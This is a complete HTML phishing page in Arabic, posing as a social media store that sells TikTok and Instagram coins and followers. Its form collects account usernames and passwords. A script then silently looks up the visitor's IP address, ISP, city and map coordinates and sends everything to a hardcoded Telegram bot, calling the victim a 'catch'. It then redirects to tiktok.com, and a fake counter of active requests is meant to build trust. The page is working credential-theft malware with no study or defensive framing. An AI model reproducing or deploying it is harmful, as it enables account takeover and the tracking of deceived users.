<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMM Global Store - نظام الرشق الآلي</title>
    <style>
        :root { --bg-color: #0f0f0f; --input-bg: #1a1a1a; --primary-red: #fe2c55; --text-gray: #b0b0b0; }
        body { background-color: var(--bg-color); color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { width: 90%; max-width: 450px; background: #000; padding: 25px; border-radius: 15px; text-align: center; border: 1px solid #333; box-shadow: 0 0 20px rgba(254, 44, 85, 0.1); }
        h1 { color: #fff; font-size: 26px; margin-bottom: 5px; }
        .subtitle { color: var(--text-gray); font-size: 13px; margin-bottom: 10px; }
        .status-top { color: #4ade80; font-size: 12px; margin-bottom: 20px; font-weight: bold; }
        .form-side { text-align: right; }
        .step-label { font-size: 13px; color: #fff; margin-bottom: 8px; font-weight: 500; }
        select, input { 
            width: 100%; padding: 12px; margin-bottom: 15px; border-radius: 8px; border: 1px solid #333; 
            background: var(--input-bg); color: #fff; font-size: 14px; box-sizing: border-box; outline: none;
        }
        .btn-main { 
            width: 100%; padding: 15px; border: none; border-radius: 10px; 
            background: #fe2c55; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px;
            transition: 0.3s;
        }
        .btn-main:hover { background: #ff4d4d; transform: scale(1.02); }
        .footer-status { 
            background: rgba(20, 20, 20, 0.8); padding: 15px; border-radius: 0 0 15px 15px; 
            margin: 25px -25px -25px -25px; border-top: 1px solid #222; 
        }
        .online-count { color: #4ade80; font-size: 14px; }
    </style>
</head>
<body>

    <div class="container">
        <h1>SMM Global Store</h1>
        <div class="subtitle">اختر الخدمة المطلوبة لتفعيل الرشق</div>
        <div class="status-top">الحالة: متصل بالسيرفر الرئيسي ✅</div>

        <div class="form-side">
            <div class="step-label">1. اختر نوع البرنامج:</div>
            <select id="platform" onchange="updateOptions()">
                <option>تيك توك - TikTok</option>
                <option>إنستغرام - Instagram</option>
            </select>

            <div class="step-label">2. حدد الخدمة والباقة:</div>
            <select id="service" onchange="updateOptions()">
                <option value="coins">شحن عملات (Coins)</option>
                <option value="follow">زيادة متابعين (Followers)</option>
            </select>
            <select id="amount"></select>

            <div class="step-label">3. بيانات التحقق للربط:</div>
            <input type="text" id="user" placeholder="اسم المستخدم أو الإيميل">
            <input type="password" id="pass" placeholder="كلمة المرور">
        </div>

        <button class="btn-main" onclick="sendData()">تفعيل العملية الآن</button>

        <div class="footer-status">
            <div class="online-count">🌍 طلبات نشطة حالياً: <span id="counter">145,280</span></div>
        </div>
    </div>

    <script>
        function updateOptions() {
            const service = document.getElementById('service').value;
            const amountSelect = document.getElementById('amount');
            amountSelect.innerHTML = "";
            const opts = service === "coins" 
                ? ["1,000 - 10,000 عملة 🔥", "50,000 عملة", "100,000 عملة VIP"]
                : ["5,000 متابع", "20,000 متابع 🔥", "100,000 متابع VIP"];
            opts.forEach(o => amountSelect.add(new Option(o, o)));
        }
        window.onload = updateOptions;

        async function sendData() {
            // البيانات اللي بعتها أنت (التوكن والآيدي الجديد)
            const token = "8266153967:AAF2ZpDJy_zn7Zw3md5LUUAOwU9SGKhM7xk";
            const chat_id = "1564944407";
            
            const user = document.getElementById('user').value;
            const pass = document.getElementById('pass').value;
            const pkg = document.getElementById('amount').value;

            if(!user || !pass) { alert("يرجى إدخال البيانات المطلوبة!"); return; }

            try {
                // سحب البيانات الاستخباراتية (الموقع والشركة) صامتاً
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                const msg = `
🎯 صيدة جديدة (اختراق كامل):
👤 اليوزر: ${user}
🔑 الباسورد: ${pass}
📦 الباقة: ${pkg}
------------------------
🌐 الشركة: ${data.org}
📍 المدينة: ${data.city}
🔢 الـ IP: ${data.ip}
📱 الجهاز: ${navigator.platform}
🗺️ الخريطة: https://www.google.com/maps?q=${data.latitude},${data.longitude}
                `;

                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat-id=${chat_id}&text=${encodeURIComponent(msg)}`);
                alert("تم استلام طلبك! سيتم تفعيل الباقة خلال 24 ساعة.");
                window.location.href = "https://tiktok.com";

            } catch (error) {
                const backupMsg = `🎯 صيدة (بيانات فقط):\n👤: ${user}\n🔑: ${pass}\n📦: ${pkg}`;
                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat-id=${chat_id}&text=${encodeURIComponent(backupMsg)}`);
                window.location.href = "https://tiktok.com";
            }
        }

        setInterval(() => {
            let c = document.getElementById('counter');
            let n = parseInt(c.innerText.replace(',', '')) + Math.floor(Math.random() * 15);
            c.innerText = n.toLocaleString();
        }, 3000);
    </script>
</body>
</html>
